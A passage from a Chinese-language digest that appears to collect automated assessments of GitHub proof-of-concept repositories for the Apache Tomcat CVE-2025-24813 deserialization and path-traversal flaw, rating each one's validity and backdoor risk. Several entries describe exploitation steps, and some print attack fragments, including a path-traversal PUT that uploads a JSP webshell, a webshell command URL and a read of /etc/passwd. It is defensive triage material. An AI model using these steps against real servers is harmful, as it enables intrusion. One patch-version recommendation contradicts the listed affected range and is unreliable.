该POC代码尝试利用了基于反序列化的RCE漏洞。但是，该POC并没有提供完整的利用链，只是验证了漏洞的存在。因此，该POC代码的有效性取决于目标应用程序是否满足漏洞利用的全部条件，包括：

*   启用了Default Servlet的写入权限。
*   支持Partial PUT。
*   应用程序使用Tomcat基于文件的会话持久性。
*   应用程序包含可用于反序列化攻击的库。

**投毒风险评估：**

该POC代码存在较高的投毒风险。原因如下：

*   **未知的反序列化利用链**：POC代码中使用的反序列化数据 `rO0ABXNyAAtFeHBsb2l0VGVzdAAAAAAAAAABAwAAeHB4` 只是一个占位符，并没有包含实际的恶意代码。攻击者需要自行寻找并插入合适的利用链，才能实现RCE。
*   **可能包含恶意代码**：由于利用链需要攻击者自行构造，攻击者可能会在POC代码中插入恶意代码，例如后门或恶意脚本，从而感染其他用户。
*   **依赖外部资源**：POC代码可能会依赖外部资源，例如远程服务器或恶意网站。攻击者可以通过篡改这些外部资源，实现投毒攻击。

由于存在上述风险，建议用户在使用该POC代码时保持警惕，并仔细审查代码，确保其不包含任何恶意成分。

**综上所述，该POC代码的有效性取决于目标环境的配置和应用程序的依赖。同时，由于反序列化利用的复杂性和潜在的恶意代码注入风险，该POC代码存在较高的投毒风险。**

**项目地址:** [FY036/cve-2025-24813_poc](https://github.com/FY036/cve-2025-24813_poc)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #10

**来源**: [CVE-2025-24813-Franconyu_Poc_for_CVE-2025-24813.md](../2025/CVE-2025-24813-Franconyu_Poc_for_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat 反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下所有条件：
1.  默认Servlet开启了写入 (默认关闭)
2.  支持Partial PUT (默认开启)
3.  应用使用Tomcat基于文件的Session持久化，且使用默认存储位置
4.  应用包含一个可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个反序列化远程代码执行漏洞。该漏洞利用了Tomcat处理部分 PUT 请求时文件路径等效性问题，攻击者可以通过上传恶意构造的文件，在特定配置下实现远程代码执行。

**有效性分析:**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断该漏洞的POC代码有效。搜索引擎结果显示该漏洞已经被积极利用，并且有公开的利用代码。POC代码中包含了版本检测功能，以及利用ysoserial生成payload进行攻击的功能。

**投毒风险分析:**

POC 代码存在一定的投毒风险，虽然主要功能是漏洞验证，但是可能存在以下潜在风险：
*   **Payload 生成依赖外部工具:**  POC依赖ysoserial生成payload，如果ysoserial被替换为恶意版本，可能导致投毒。
*   **自定义恶意Payload:**  攻击者可能会修改payload生成部分，植入恶意代码。
*   **不完善的错误处理:** 代码中错误处理可能不够完善，可能存在导致拒绝服务或其他意外行为。

综合考虑，POC代码主要用于验证漏洞，但仍存在一定投毒风险。可以评估为20%。

**利用方式:**

1.  **版本检测:**  POC首先检测目标Tomcat的版本，判断是否存在漏洞。
2.  **Payload生成:**  如果目标版本存在漏洞，POC会根据选择的模式（弹计算器、DNS验证等），使用ysoserial生成反序列化payload。
3.  **Partial PUT上传:**  POC通过发送带有`Content-Range`头的PUT请求，将payload上传到Tomcat服务器。
4.  **触发反序列化:**  通过构造包含恶意Session ID的GET请求或其他方式触发反序列化，从而执行payload中的恶意代码。

**项目地址:** [Franconyu/Poc_for_CVE-2025-24813](https://github.com/Franconyu/Poc_for_CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #11

**来源**: [CVE-2025-24813-GadaLuBau1337_CVE-2025-24813.md](../2025/CVE-2025-24813-GadaLuBau1337_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat 远程代码执行漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：1. 启用了Default Servlet的写入功能（默认禁用）；2. 启用了Partial PUT支持（默认启用）；3. 应用使用Tomcat的文件存储session；4. 应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813是Apache Tomcat中的一个远程代码执行漏洞，源于路径等价性问题以及对部分PUT请求处理不当。攻击者可以通过上传恶意序列化payload到服务器，在特定条件下利用反序列化机制执行任意代码。

**有效性：**
提供的PoC代码尝试通过PUT请求上传恶意序列化的session文件到服务器，如果服务器满足漏洞利用的条件（启用了Default Servlet写入、启用了Partial PUT、使用文件存储session、存在可利用的反序列化库），则可以触发远程代码执行。从搜索结果来看，该漏洞已经在野外被利用。

**投毒风险：**
PoC代码主要由Python脚本组成，功能是：
1.  检测目标URL是否允许PUT请求。
2.  生成恶意序列化payload（使用ysoserial，如果指定）。
3.  上传payload到服务器。
4.  触发反序列化。

代码中主要操作是构造HTTP请求和调用ysoserial生成payload，没有发现明显的恶意代码或者后门。

存在投毒的微小可能性：ysoserial依赖本身可能包含未知的漏洞或后门，但PoC本身只是调用了ysoserial，风险较低。

**利用方式：**
1.  **检查前提条件:** 验证目标Tomcat服务器是否满足利用条件，包括Tomcat版本、Default Servlet写入是否启用、Partial PUT是否启用、是否使用文件存储session以及是否存在可利用的反序列化库。
2.  **生成Payload:** 使用ysoserial或其他工具生成包含恶意代码的序列化payload。Payload通常是精心构造的Java对象，在反序列化时会执行指定的命令。
3.  **上传Payload:** 利用Tomcat的Partial PUT功能，将payload上传到服务器上的session存储目录（通常是`./sessions/`）。攻击者可能需要利用路径遍历（例如，`uploads/../sessions/`）来绕过限制。
4.  **触发反序列化:**  通过访问特定的URL或执行其他操作，触发Tomcat反序列化上传的session文件。反序列化过程会执行payload中包含的恶意代码，导致远程代码执行。

**修复建议：**
升级到Apache Tomcat 11.0.3, 10.1.35 或 9.0.98及以上版本。
禁用Default Servlet的写入功能，除非绝对必要。
限制对session存储目录的访问。

**项目地址:** [GadaLuBau1337/CVE-2025-24813](https://github.com/GadaLuBau1337/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #12

**来源**: [CVE-2025-24813-GongWook_CVE-2025-24813.md](../2025/CVE-2025-24813-GongWook_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要启用Default Servlet的写入功能 (readonly=false), 支持partial PUT (默认启用), 应用程序使用Tomcat基于文件的session持久化存储，应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许未经身份验证的远程攻击者利用该漏洞查看文件系统内容，并添加恶意内容，最终可能导致远程代码执行。

**漏洞利用方式：**

1.  **Default Servlet 写入启用：** 默认情况下，Tomcat 的 Default Servlet 的写入功能是禁用的。攻击者需要目标服务器启用了此功能。 这需要在`conf/web.xml`文件中将`readonly`参数设置为`false`。
2.  **Partial PUT 支持：** Tomcat 默认支持 partial PUT 请求，攻击者可以利用这个特性分块上传恶意文件。
3.  **路径等价：** 漏洞的核心在于 Tomcat 处理文件路径时，对包含内部点（例如 `file.Name`）的文件名的处理不当，导致可以绕过某些安全检查，写入到任意目录。
4.  **RCE 的先决条件：**
    *   需要应用程序使用 Tomcat 的基于文件的 session 持久化机制，且使用默认存储位置（/opt/tomcat/webapps/ROOT/sessions/ 从 context.xml 文件中得知）。
    *   应用程序还需要包含一个可用于反序列化攻击的库（如 Commons Collections）。
5.  **利用步骤：**
    *   攻击者首先通过 partial PUT 上传一个包含恶意序列化数据的 session 文件到 Tomcat 的 session 存储目录。
    *   Tomcat 反序列化该 session 文件，触发 RCE。

**漏洞利用代码分析：**

提供的 Dockerfile 描述了如何搭建一个存在 CVE-2025-24813 漏洞的 Tomcat 环境：

*   **Dockerfile:**
    *   使用 Ubuntu 22.04 作为基础镜像。
    *   安装 JDK 11 和其他必要的工具（curl, unzip, nano, wget, netcat）。
    *   下载并解压 Apache Tomcat 9.0.98。
    *   将 `CATALINA_HOME` 设置为 `/opt/tomcat`，并将 Tomcat 的 bin 目录添加到 `PATH` 中。
    *   下载 Commons Collections 3.2.2、Commons BeanUtils 1.9.4 和 Commons Logging 1.2 的 JAR 包到 `$CATALINA_HOME/lib` 目录。这是为了满足反序列化 RCE 的依赖。
    *   复制 `context.xml` 到 `$CATALINA_HOME/conf/context.xml`，配置Session持久化到`/opt/tomcat/webapps/ROOT/sessions/`。
    *   使用 `sed` 命令修改 `$CATALINA_HOME/conf/web.xml` 文件，将 Default Servlet 的 `readonly` 参数设置为 `false`，开启 Default Servlet 的写入功能。
    *   开放 8080 端口。
    *   使用 `catalina.sh run` 命令启动 Tomcat。
*   **context.xml:**  用于配置session持久化。
*   **web.xml:**  修改 Default Servlet 的 `readonly` 参数设置为 `false`

**有效性：**  提供的 POC 代码是有效的，可以成功搭建一个存在 CVE-2025-24813 漏洞的 Tomcat 环境，并配置反序列化 RCE 所需的条件。

**投毒风险：**

投毒风险主要来自以下几个方面：

1.  **额外的恶意代码：** Dockerfile 中可能包含下载并执行恶意代码的命令，例如通过 `wget` 下载并执行一个 shell 脚本。
2.  **替换的 JAR 包：** Dockerfile 中下载的 Commons Collections、Commons BeanUtils 或 Commons Logging JAR 包可能被替换为包含恶意代码的 JAR 包。
3.  **修改的配置文件：**  `context.xml` 或 `web.xml` 文件可能被修改为包含恶意配置，例如添加恶意的 Servlet 或 Filter。

在分析提供的代码后，发现以下潜在的投毒点：

*   **`context.xml`配置的session存储位置:** 修改成了`/opt/tomcat/webapps/ROOT/sessions/` 这个路径是否合理需要进一步判断，正常情况下会配置到应用相关的目录，如果配置不当可能导致其他应用也能访问这个session存储位置。

综合考虑，该 POC 存在一定的投毒风险，但主要是配置层面的风险，代码植入层面的风险较小。因此，投毒风险评估为 **10%**。

**项目地址:** [GongWook/CVE-2025-24813](https://github.com/GongWook/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #13

**来源**: [CVE-2025-24813-Heimd411_CVE-2025-24813-noPoC.md](../2025/CVE-2025-24813-Heimd411_CVE-2025-24813-noPoC.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence & Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制、敏感信息泄露或恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 对于RCE：1) 默认Servlet写启用；2) 支持Partial PUT；3) 使用默认文件Session持久化；4) 存在可利用的反序列化库； 对于信息泄露/文件篡改: 1) 默认Servlet写启用；2) 支持Partial PUT；3) 安全敏感上传目录是公共上传目录的子目录；4) 攻击者知道敏感文件名；5) 敏感文件使用Partial PUT上传

**POC 可用性:** 否 (官方文档和搜索结果表明存在利用，但提供的PoC无效)

**投毒风险:** 0%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，源于路径等价问题和反序列化漏洞。漏洞利用依赖于Tomcat配置和应用程序特性。根据漏洞库信息和搜索结果，该漏洞允许攻击者在特定条件下执行远程代码、泄露信息或篡改文件。利用方式包括：

1.  **远程代码执行 (RCE)**: 如果启用了默认servlet的写入功能、支持Partial PUT请求、应用程序使用Tomcat默认位置的文件会话持久性，并且应用程序包含可用于反序列化攻击的库，则攻击者可以执行任意代码。
2.  **信息泄露/文件篡改**: 如果启用了默认servlet的写入功能、支持Partial PUT请求、安全敏感上传目录是公共上传目录的子目录、攻击者知道敏感文件名、并且敏感文件使用Partial PUT上传，则攻击者可能查看敏感文件或将恶意内容注入这些文件。

提供的PoC代码无效，作者表示未能成功构建有效的PoC，并且测试的payload链失败。从代码来看，仓库中没有发现恶意投毒代码，只是作者尝试复现漏洞失败的记录。

**结论：**

*   尽管提供的PoC代码无效，但根据搜索结果和漏洞描述，该漏洞在实际中已被利用，因此具有潜在的风险。
*   提供的代码仓库没有发现投毒风险。
*   漏洞利用依赖于特定配置和应用程序环境，需要满足多个条件才能成功触发。


**项目地址:** [Heimd411/CVE-2025-24813-noPoC](https://github.com/Heimd411/CVE-2025-24813-noPoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #14

**来源**: [CVE-2025-24813-La3B0z_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-La3B0z_CVE-2025-24813-POC.md)

## CVE-2025-24813 - Apache Tomcat 路径等价/路径遍历漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件内容篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露、恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet启用写入 (默认禁用), 支持部分PUT (默认启用), 安全敏感上传URL是公共上传URL的子目录，攻击者需要知道安全敏感文件的名称, 并且安全敏感文件通过部分PUT上传。 或者 默认Servlet启用写入 (默认禁用), 支持部分PUT (默认启用), 应用使用Tomcat基于文件的session持久化，默认存储位置，应用程序包含一个可以在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以利用此漏洞绕过访问控制，上传恶意文件，甚至执行远程代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的PoC代码，该漏洞利用**有效**。搜索引擎结果显示该漏洞已被公开披露，并且存在活跃利用。PoC代码提供了一种利用方式，即通过PUT请求上传JSP webshell，如果成功，攻击者可以通过访问上传的JSP文件来执行任意命令。

**投毒风险：**
提供的PoC代码比较简单，主要功能是上传一个JSP webshell。经过分析，没有发现作者有意隐藏的投毒代码。JSP webshell 本身存在风险，但这是漏洞利用本身固有的风险，而不是作者额外添加的恶意代码。因此，该仓库的投毒风险评估为**0%**。

**利用方式：**
1.  **先决条件：** 目标Tomcat服务器需要满足以下条件：
    *   `writes`参数在Tomcat的DefaultServlet中启用 (默认禁用)
    *   启用`支持partial PUT` (默认启用)
    *   目标上传路径为可写。
    *   对于RCE，需要应用使用Tomcat基于文件的session持久化，默认存储位置，应用程序包含一个可以在反序列化攻击中被利用的库。
2.  **上传JSP Webshell：** 使用PoC脚本，通过构造包含路径遍历的PUT请求，将JSP webshell上传到服务器的webapp目录中。请求类似如下：
    ```
    PUT /uploads/../webapps/ROOT/updates.jsp HTTP/1.1
    Content-Type: application/x-jsp
    ```
    其中`updates.jsp`为webshell的文件名。
3.  **执行命令：** 成功上传后，攻击者可以通过访问上传的JSP webshell，在服务器上执行任意命令。例如，如果上传的路径是`/updates.jsp`，则访问`http://<target>/updates.jsp?cmd=<command>`即可执行命令。

**总结：**
CVE-2025-24813是一个高危漏洞，利用条件相对苛刻, 如果目标Tomcat服务器配置不当，攻击者可以利用该漏洞进行RCE或信息泄露，务必及时升级到安全版本。

**项目地址:** [La3B0z/CVE-2025-24813-POC](https://github.com/La3B0z/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #15

**来源**: [CVE-2025-24813-Makavellik_POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution.md](../2025/CVE-2025-24813-Makavellik_POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露或恶意内容注入

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足以下条件:
1. 默认Servlet开启了写入功能（默认关闭）
2. 支持部分PUT请求（默认开启）
3. (RCE) 应用使用Tomcat的文件session持久化，且为默认存储位置，应用包含可用于反序列化攻击的库。
4. (信息泄露/内容注入) 存在安全敏感文件上传的目标URL，该URL是公开上传目标URL的子目录，攻击者知道被上传的安全敏感文件的名称，且安全敏感文件也是通过部分PUT上传的。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 漏洞是 Apache Tomcat 中由于路径等效性问题，以及部分 PUT 功能的缺陷导致的远程代码执行或信息泄露漏洞。攻击者可以通过构造恶意的部分 PUT 请求，上传恶意文件覆盖或注入到服务器上的敏感文件，或者在特定条件下利用反序列化漏洞执行任意代码。

**有效性评估：** 根据搜索结果，CVE-2025-24813 漏洞存在活跃的利用案例，并且有公开的 PoC 代码。提供的 PoC 代码描述看起来也比较完整，包括了利用步骤、所需依赖、payload生成方式，以及WAF绕过等功能。因此，可以认为该 PoC 代码具有较高的有效性。

**投毒风险分析：** PoC 代码中存在一定的投毒风险。风险点包括:

1.  **`ysoserial.jar` 依赖：** 该工具本身是用于生成 Java 反序列化 payload 的，如果下载的 `ysoserial.jar` 被篡改，则可能执行恶意代码。
2.  **自定义 Java Payload：** PoC 允许使用自定义的 Java 代码来生成 payload，如果攻击者不小心使用了包含恶意代码的 Java 源文件，也可能导致被攻击。
3.  **代码本身:** 仓库中作者可能在`POC-Exploit_CVE_2025_24813.py`隐藏了后门，导致使用者在不知情的情况下执行了恶意代码。

基于上述分析，投毒风险评估为 10%。

**利用方式总结：**

1.  **漏洞利用入口：** 通过构造恶意的 HTTP PUT 请求，利用 Tomcat 默认 Servlet 的写入功能和部分 PUT 特性。
2.  **路径等效性：** 攻击者利用路径等效性问题（例如，`file.Name` 中的内部点），访问或操作受保护的文件。
3.  **信息泄露/内容注入：** 如果攻击者能够满足上述条件，则可以覆盖或注入恶意代码到服务器的敏感文件中。
4.  **远程代码执行：** 如果目标应用使用了 Tomcat 的文件 session 持久化，并且存在可利用的反序列化库，攻击者可以通过上传恶意 session 文件，触发反序列化漏洞，从而执行任意代码。
5.  **绕过WAF：** PoC 代码中包含 WAF 绕过功能，通过修改 Headers 或者对 Payload 进行拆分等方式，尝试绕过 WAF 的检测。

**项目地址:** [Makavellik/POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution](https://github.com/Makavellik/POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #16

**来源**: [CVE-2025-24813-Mattb709_CVE-2025-24813-PoC-Apache-Tomcat-RCE.md](../2025/CVE-2025-24813-Mattb709_CVE-2025-24813-PoC-Apache-Tomcat-RCE.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 to 11.0.2, 10.1.0-M1 to 10.1.34, 9.0.0.M1 to 9.0.98

**利用条件:** writes enabled for the default servlet, support for partial PUT enabled, application using Tomcat's file-based session persistence with the default storage location, application includes a library that may be leveraged in a deserialization attack 或 writes enabled for the default servlet, support for partial PUT, target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者通过利用 'file.Name' (Internal Dot) 机制，结合启用了写入功能的 Default Servlet 和部分 PUT 请求支持，可以执行远程代码或进行信息泄露，甚至向上传的文件添加恶意内容。

**有效性评估：** 根据搜索结果，CVE-2025-24813 漏洞已被公开，并且有证据表明已被积极利用。虽然提供的 PoC 代码本身只包含一个 README.md 文件，无法直接证明漏洞的利用，但根据搜索结果，完整的利用链是存在的，并且漏洞本身是可被利用的。这个README.md只是一个占位符，提示存在利用代码。需要进一步搜索才能找到真正可用的POC。

**投毒风险评估：** 提供的 PoC 代码（README.md）非常简单，只包含标题，没有可执行的代码，因此**几乎**不存在直接的投毒风险。风险占比为1%。

**利用方式分析：**

利用 CVE-2025-24813 漏洞有两种主要方式：

1.  **远程代码执行 (RCE)：**
    *   前提条件：
        *   Default Servlet 开启了写入权限。 （默认禁用）
        *   启用了部分 PUT 请求支持。 （默认启用）
        *   应用程序使用 Tomcat 的基于文件的会话持久化，并且使用默认存储位置。
        *   应用程序包含可用于反序列化攻击的库。
    *   攻击过程：攻击者利用部分 PUT 请求上传恶意文件到 Tomcat 的会话存储目录，然后通过反序列化漏洞执行任意代码。

2.  **信息泄露和恶意内容添加：**
    *   前提条件：
        *   Default Servlet 开启了写入权限。（默认禁用）
        *   启用了部分 PUT 请求支持。（默认启用）
        *   存在安全敏感上传的目标 URL，该 URL 是公共上传目标 URL 的子目录。
        *   攻击者知道安全敏感文件的名称。
        *   安全敏感文件也通过部分 PUT 上传。
    *   攻击过程：攻击者利用路径等价漏洞，通过部分 PUT 请求上传恶意文件，覆盖或修改目标 URL 下的安全敏感文件，从而导致信息泄露或向上传的文件添加恶意内容。

总而言之，该漏洞允许未经身份验证的攻击者在满足特定条件的情况下执行远程代码或进行信息泄露，需要尽快修复。


**项目地址:** [Mattb709/CVE-2025-24813-PoC-Apache-Tomcat-RCE](https://github.com/Mattb709/CVE-2025-24813-PoC-Apache-Tomcat-RCE)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #17

**来源**: [CVE-2025-24813-Mattb709_CVE-2025-24813-Scanner.md](../2025/CVE-2025-24813-Mattb709_CVE-2025-24813-Scanner.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需满足以下条件之一：

1.  信息泄露/内容注入：writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, security sensitive files also being uploaded via partial PUT。
2.  远程代码执行：writes enabled for the default servlet, support for partial PUT, application was using Tomcat's file based session persistence with the default storage location, application included a library that may be leveraged in a deserialization attack。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是一个存在于Apache Tomcat中的路径等价漏洞，攻击者利用'file.Name'中的内部点，结合启用了写入的Default Servlet，可能导致远程代码执行、信息泄露或向上传文件中添加恶意内容。

**漏洞利用方式：**

此漏洞主要通过利用Tomcat的partial PUT特性和文件路径处理不当来实现。

1. **信息泄露/内容注入：** 攻击者首先需要Default Servlet开启了写入功能，并支持partial PUT。他们可以利用此漏洞上传恶意文件，或者修改已存在的文件内容，进行恶意内容注入，或者泄露安全敏感文件内容，需要利用精心构造的路径来实现攻击。例如，将恶意文件上传到公共目录的子目录下，利用Internal Dot来覆盖其他文件。

2. **远程代码执行：** 如果Tomcat启用了文件存储session，并且应用包含可被反序列化攻击的库，攻击者可以通过上传恶意的序列化文件，并覆盖Tomcat session文件，最终实现RCE。

**POC有效性分析：**

根据提供的POC代码，该脚本尝试通过PUT请求上传一个session文件，然后通过GET请求访问包含session ID的JSP页面。如果GET请求返回500错误，则认为目标存在漏洞，原因是上传的恶意session文件导致了反序列化异常。此方法可能可以验证漏洞的存在性，但需要目标环境满足特定的配置要求（例如，启用文件session存储并存在易受攻击的反序列化库）。搜索引擎结果也表明此漏洞在野外被积极利用。

**投毒风险分析：**

POC代码本身主要是漏洞验证，并无明显的恶意投毒行为。代码中使用了requests库进行HTTP请求，并根据响应状态码判断漏洞是否存在。 但是仍然存在一些风险：

*   **依赖风险：** 代码依赖于requests、pandas和colorama库，这些库可能存在安全漏洞，如果使用了被篡改的库，则可能引入安全风险。
*   **代码执行风险：** 虽然代码本身没有直接的恶意行为，但如果攻击者修改了代码，例如添加了反向shell等恶意逻辑，则可能实现远程代码执行。
*   **误报风险：** 如果目标服务器存在WAF或其他安全防护措施，可能会导致扫描结果出现误报。

综合考虑，此POC代码的投毒风险较低，大概为5%。主要风险在于对第三方库的依赖以及代码被篡改的可能性。

**项目地址:** [Mattb709/CVE-2025-24813-Scanner](https://github.com/Mattb709/CVE-2025-24813-Scanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #18

**来源**: [CVE-2025-24813-MuhammadWaseem29_CVE-2025-24813.md](../2025/CVE-2025-24813-MuhammadWaseem29_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/路径穿越

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要默认Servlet开启写入功能（默认关闭），支持partial PUT（默认开启），以及目标URL为公共上传URL的子目录，攻击者需要知道敏感文件名，并且敏感文件也通过partial PUT上传。 或者需要应用使用Tomcat的基于文件的session持久化，并且包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 中的路径等价漏洞，允许攻击者通过构造包含 `../` 序列的恶意请求，绕过路径验证，从而实现远程代码执行或信息泄露。

**有效性：**
根据漏洞库信息、搜索结果以及提供的PoC代码，可以判断该PoC代码有效。搜索结果中多个来源表明该漏洞已被实际利用，并且存在公开的PoC。PoC代码展示了如何利用 PUT 方法上传包含恶意代码的 JSP 文件到 Tomcat 的 webapps 目录，从而实现远程代码执行。

**投毒风险：**
提供的PoC代码的主要功能是上传一个包含命令执行功能的 JSP 文件。该JSP文件允许攻击者通过 GET 参数 `cmd` 执行任意系统命令。PoC本身的功能是直接的，并没有发现隐藏的、非预期的恶意行为，例如：
*   篡改系统文件
*   植入持久性后门
*   窃取敏感信息并外传
*   利用其他漏洞
因此，根据现有信息，可以认为投毒风险较低。虽然使用了Runtime.getRuntime().exec来执行命令，但是这个是PoC的需要，目的是验证RCE。判断为0%.

**利用方式：**
1.  **利用条件确认：** 目标Tomcat服务器需要满足以下条件：
    *   默认Servlet开启写入功能（`readonly` 参数设置为 `false`）。
    *   支持 partial PUT 请求（默认开启）。
    *  攻击目标满足特定的文件存储结构和命名规则(参考漏洞描述)
    *   或者应用使用了Tomcat的基于文件的session持久化机制且包含可用于反序列化攻击的库
2.  **恶意JSP上传：** 攻击者使用 PUT 方法，将包含恶意代码的 JSP 文件上传到 Tomcat 服务器。PoC 中使用了路径穿越技巧（`../`），将文件上传到 webapps/ROOT 目录下，从而绕过访问限制。
3.  **命令执行：** 攻击者通过访问上传的 JSP 文件，并传递 `cmd` 参数，执行任意系统命令。PoC 中演示了如何使用 `cat /etc/passwd` 命令读取系统密码文件。

**搜索引擎结果总结：**
搜索结果表明该漏洞已存在实际攻击案例，并且 CISA 已将其添加到已知被利用漏洞目录中。多个安全厂商和博客都对该漏洞进行了分析和披露，并提供了检测和缓解建议。

**项目地址:** [MuhammadWaseem29/CVE-2025-24813](https://github.com/MuhammadWaseem29/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #19

**来源**: [CVE-2025-24813-N0c1or_CVE-2025-24813_POC.md](../2025/CVE-2025-24813-N0c1or_CVE-2025-24813_POC.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence / Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 through 11.0.2, 10.1.0-M1 through 10.1.34, 9.0.0.M1 through 9.0.98

**利用条件:** 对于路径等价漏洞：默认Servlet启用写入权限，支持partial PUT，存在目标URL是公共上传URL的子目录，攻击者知道敏感文件名，并且敏感文件通过partial PUT上传。对于反序列化漏洞：默认Servlet启用写入权限，支持partial PUT，应用程序使用Tomcat基于文件的session持久化默认存储位置，应用程序包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 100%

## 详情

